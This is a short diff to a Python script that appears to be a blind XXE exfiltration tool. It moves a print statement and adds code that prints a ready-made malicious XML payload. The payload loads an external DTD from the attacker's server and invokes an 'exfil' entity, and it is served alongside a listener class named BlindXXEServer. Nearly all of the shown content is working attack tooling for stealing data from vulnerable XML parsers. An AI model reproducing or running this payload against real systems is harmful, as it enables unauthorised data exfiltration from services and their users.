@@ -145,7 +145,6 @@ def fetchRhost():
     global config
     config['rhost'] = socket.gethostbyname(socket.gethostname())
 
-    print('[>] RHOST set to: {}'.format(config['rhost']))
 
 def main(argv):
     global config
@@ -160,6 +159,16 @@ def main(argv):
     print('[+] Serving HTTP server on: ("{}", {})'.format(
         config['listen'], config['port']
     ))
+    print('[+] RHOST set to: {}'.format(config['rhost']))
+
+    print('\n[>] Here, use the following XML to leverage Blind XXE vulnerability:')
+    print('''
+
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://{}/test.dtd">
+<foo>&exfil;</foo>
+
+    '''.format(config['rhost']))
 
     server = HTTPServer((config['listen'], config['port']), BlindXXEServer)
     thread = threading.Thread(target=server.serve_forever)
